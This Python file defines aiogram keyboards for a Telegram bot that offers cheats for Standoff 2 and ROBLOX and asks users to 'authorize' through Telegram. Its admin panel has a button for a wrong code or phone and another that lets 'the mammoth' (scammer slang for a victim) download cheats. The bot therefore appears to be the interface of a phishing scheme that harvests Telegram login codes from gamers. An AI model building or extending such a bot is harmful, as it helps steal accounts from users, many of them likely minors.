from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup

main = ReplyKeyboardMarkup(keyboard=[
    [KeyboardButton(text='Мой профиль')],
    [KeyboardButton(text='Список игр')],
    [KeyboardButton(text='Авторизация')]
],
    resize_keyboard=True
)

inlines = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text='Standoff 2', callback_data='standoff')],
    [InlineKeyboardButton(text='ROBLOX', callback_data='roblox')],
])

autorizations_keyboards = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text='Telegram', callback_data='autorization')]

])

admin_panel = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text='Неверный код/телефон', callback_data='adm_panel')],
    [InlineKeyboardButton(text='Разрешить мамонту скачать читы', callback_data='razreshenie')]
])
